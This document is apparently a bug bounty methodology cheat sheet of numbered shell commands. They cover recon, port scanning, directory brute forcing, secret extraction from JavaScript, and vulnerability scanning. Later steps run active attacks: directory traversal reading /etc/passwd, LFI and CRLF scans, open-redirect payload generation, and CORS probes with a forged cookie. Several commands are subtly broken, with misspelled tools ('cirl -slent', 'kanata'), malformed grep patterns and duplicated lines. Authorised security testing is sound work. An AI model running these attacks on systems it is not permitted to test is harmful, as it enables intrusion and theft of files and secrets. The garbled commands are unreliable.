# Bug Bounty Methodology

## Reconnaissance and Subdomain Enumeration

1. **Subdomain Enumeration with `subfinder`**
    ```bash
    subfinder -dL domains.txt -all -recursive -o subdomains.txt
    ```
    - **Action:** Discovers subdomains from the domains listed in `domains.txt`, performs recursive search, and saves the results to `subdomains.txt`.

2. **Count the Number of Subdomains**
    ```bash
    cat subdomains.txt | wc -l
    ```
    - **Action:** Counts the number of subdomains listed in `subdomains.txt`.

3. **Fetch Subdomains from Certificate Transparency Logs**
    ```bash
    curl -s https://crt.sh/?q=amazon.com&output=json | jq -r '.[].name_value' | grep -Po '(\w+\.\w+\.\w+)$' | anew subdomains.txt
    ```
    - **Action:** Fetches subdomains from Certificate Transparency logs for `amazon.com`, extracts domain names, and appends them to `subdomains.txt`.

4. **Check Which Subdomains Are Alive with `httpx-toolkit`**
    ```bash
    cat subdomains.txt | httpx-toolkit -l subdomains.txt -ports 443,80,8080,8000,8888 -threads 200 > subdomains_alive.txt
    ```
    - **Action:** Checks which subdomains are alive by probing common HTTP ports, using multiple threads, and saves the results to `subdomains_alive.txt`.

5. **Count the Number of Alive Subdomains**
    ```bash
    cat subdomains_alive.txt | wc -l
    ```
    - **Action:** Counts the number of alive subdomains listed in `subdomains_alive.txt`.

## Port Scanning and Service Detection

6. **Port Scanning and Service Detection with `naabu`**
    ```bash
    naabu -list subdomains.txt -c 50 -nmap-cli 'nmap -sV -sC' -o naabu-full.txt
    ```
    - **Action:** Performs port scanning and service detection on subdomains listed in `subdomains.txt` using `naabu` and `nmap`, saving the results to `naabu-full.txt`.

## Directory Brute Forcing and Parameter Extraction

7. **Directory Brute Forcing with `dirsearch`**
    ```bash
    dirsearch -l subdomains_alive.txt -x 500,502,429,404,400 -R 5 --random-agent -t 100 -F -o directory.txt -w /usr/share/seclists/common.txt
    ```
    - **Action:** Brute-forces directories on live subdomains, excluding certain HTTP status codes, using a random user agent and multiple threads, and saves the results to `directory.txt`.

8. **Count the Number of Discovered Directories**
    ```bash
    cat directory.txt | wc -l
    ```
    - **Action:** Counts the number of directories found in `directory.txt`.

9. **Extract Parameters from Alive Subdomains with `gau`**
    ```bash
    cat subdomains_alive.txt | gau > params.txt
    ```
    - **Action:** Extracts parameters from live subdomains using `gau` and saves them to `params.txt`.

10. **Count the Number of Extracted Parameters**
    ```bash
    cat params.txt | wc -l
    ```
    - **Action:** Counts the number of parameters extracted and saved in `params.txt`.

11. **Filter Parameters with `uro`**
    ```bash
    cat params.txt | uro -o filterparam.txt
    ```
    - **Action:** Filters out useful parameters from `params.txt` using `uro` and saves the results to `filterparam.txt`.

12. **Count the Number of Filtered Parameters**
    ```bash
    cat filterparam.txt | wc -l
    ```
    - **Action:** Counts the number of filtered parameters in `filterparam.txt`.

## JavaScript File Analysis and Secret Extraction

13. **Find JavaScript Files**
    ```bash
    cat filterparam.txt | grep ".js$" > jsfiles.txt
    ```
    - **Action:** Searches for URLs ending with `.js` in `filterparam.txt` and saves them to `jsfiles.txt`.

14. **Extract Unique JavaScript Files**
    ```bash
    cat jsfiles.txt | uro | anew jsfiles.txt
    ```
    - **Action:** Extracts unique JavaScript files from `jsfiles.txt` using `uro` and updates the file.

15. **Count the Number of JavaScript Files**
    ```bash
    cat jsfiles.txt | wc -l
    ```
    - **Action:** Counts the number of JavaScript files listed in `jsfiles.txt`.

16. **Extract Secrets from JavaScript Files with `SecretFinder`**
    ```bash
    cat jsfiles.txt | while read url; do python3 /SecretFinder.py -i $url -o cli >> secret.txt; done
    ```
    - **Action:** Uses `SecretFinder` to search for secrets in each JavaScript file URL and appends the results to `secret.txt`.

17. **Search for Specific Secrets in `secret.txt`**
    ```bash
    cat secret.txt | grep aws/username//account_id/heroku
    ```
    - **Action:** Searches for specific keywords related to secrets in `secret.txt`.

## Vulnerability Scanning and Analysis

18. **Run Nuclei Scans**
    ```bash
    nuclei -list filterparam.txt -c 70 -rl 200 -fhr -lfa -t /Nuclei-Template -o nuclei-target.txt -es info
    nuclei -list sorted_param_10k.txt -c 70 -rl 200 -fhr -lfa -t /Nuclei-Template -o nuclei-target.txt -es info
    ```
    - **Action:** Runs Nuclei scans on the filtered parameters or sorted parameters file using specified templates and saves results to `nuclei-target.txt`.

19. **Search Shodan for Target Information**
    ```bash
    # Search for target information on Shodan
    # Example: ssl: 'target.com' 200
    # Facet Analysis: ssl: 'target.com' 200 "http:status/title"
    ```

## Advanced Scanning and Enumeration

20. **Additional Subdomain Enumeration and Checking**
    ```bash
    subfinder -d target.com -all -recursive > subdomains.txt
    cat subdomains.txt | httpx-toolkit -ports 443,80,8080,8000,8888 -threads 200 > subdomains_alive.txt
    ```
    - **Action:** Discovers subdomains for `target.com`, checks which are alive, and saves the results.

21. **URL and Parameter Extraction with `katana`**
    ```bash
    katana -u subdomains_alive.txt -d 5 -ps -pss -waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef wolf,css,png,svg,jpg,wolf2,jpeg,gif,svg -o allurls.txt
    ```
    - **Action:** Extracts URLs and parameters from live subdomains using `katana` and saves to `allurls.txt`.

22. **Count the Number of Extracted URLs**
    ```bash
    cat allurls.txt | wc -l
    ```
    - **Action:** Counts the number of URLs listed in `allurls.txt`.

23. **Filter for Specific File Types**
    ```bash
    cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
    cat allurls.txt | grep -E "\.js$" >> js.txt
    ```
    - **Action:** Filters URLs for specific file types and saves them to `js.txt`.

24. **Run Nuclei Scan for JavaScript Exposures**
    ```bash
    cat js.txt | nuclei -t /Nuclei-Template/http/exposures/ -c 30
    ```

25. **Run Nuclei Scan for Exposures from Google Search**
    ```bash
    echo www.target.com | kanata -ps | grep -E "\.js$" | nuclei -t /Nuclei-Template/http/exposures/ -c 30
    ```

26. **Directory Brute Forcing on Specific URL**
    ```bash
    dirsearch -u https://www.validator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bkp,cache,cgi,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,sql,sql.gz,http://sql.zip,sql.tar,gz,sql~,swp,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js,.json
    ```

27. **Subdomain Vulnerability Scanning with `subzy`**
    ```bash
    subzy run --targets subdomains_alive.txt --verify-ssl
    # Optional: Increase concurrency and hide failures
    # subzy run --targets subdomains_alive.txt --concurrency 100 --hide-fails --verify-ssl
    ```

28. **Check for Specific Paths in Subdomains**
    ```bash
    cat subdomains.txt | grep dashboard
    cat subdomains.txt | grep admin/beta/staging/dev/control/panel/api/old
    ```

29. **Test CORS Misconfigurations**
    ```bash
    python3 corsy.py -i /subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION:Hacked"
    ```

30. **Run Nuclei Scans for CORS and Other Tags**
    ```bash
    nuclei -list /subdomains_alive.txt -t /Priv8-Nuclei/cors
    nuclei -list /subdomains_alive.txt -tags cves,osint,tech
    ```

31. **Local File Inclusion Testing**
    ```bash
    cat allurls.txt | gf lfi | nuclei -tags lfi
    ```

32. **Generate and Test Payloads**
    ```bash
    bash make-payloads.sh www.target.com
    cat allurls.txt | gf redirect | openredirex -p /Open-Redirect/payloads/burp/www.target.com.txt
    ```

33. **Check for CRLF Injection Vulnerabilities**
    ```bash
    cat subdomains.txt | nuclei -t /Priv8-Nuclei/crlf/crlf2.yaml -v
    cat allurls.txt | gf redirect | openredirex
    ```

34. **Google Dorks for Open Redirects**
    ```bash
    # Use Google Dorks to find open redirects
    # Example: site:target.com inurl:redir |inurl: redirect | inurl:url | inurl:return | inurl:src=http | inurl:r=http | inurl:goto=http
    ```

35. **Extract and Test JavaScript Files**
    ```bash
    subfinder -d target.com | httpx-toolkit | gau | uro | gf lfi | tee domains.txt
    nuclei -list domains.txt -tags lfi
    echo 'sub.target.com' | gau | uro | gf lfi
    nuclei -target 'https://sub.target.com/home.php?page=about.php' -tags lfi
    nuclei -target 'https://sub.other.com' -tags lfi
    ```

36. **Directory Traversal Testing**
    ```bash
    dotdotpwn -m http-url -d 10 -f /etc/passwd -u "http://www.target.com?page=TRAVERSAL" -b -k "root:"
    subfinder -d mylocal.life | httpx-toolkit | gau | uro | gf lfi | qsreplace "/etc/passwd" | while read url; do cirl -slent "$url" | grep "root:x:" && echo "$url is vulnerable"; done;
    ```

37. **Parameter Spidering**
    ```bash
    paramspider -d vuln.target.com --subs
    dotdotpwn -m http-url -d 10 -f /etc/passwd -u "http://www.target.com?page=TRAVERSAL" -b -k "admin:"
    paramspider -d vuln.target.com --subs
    ```

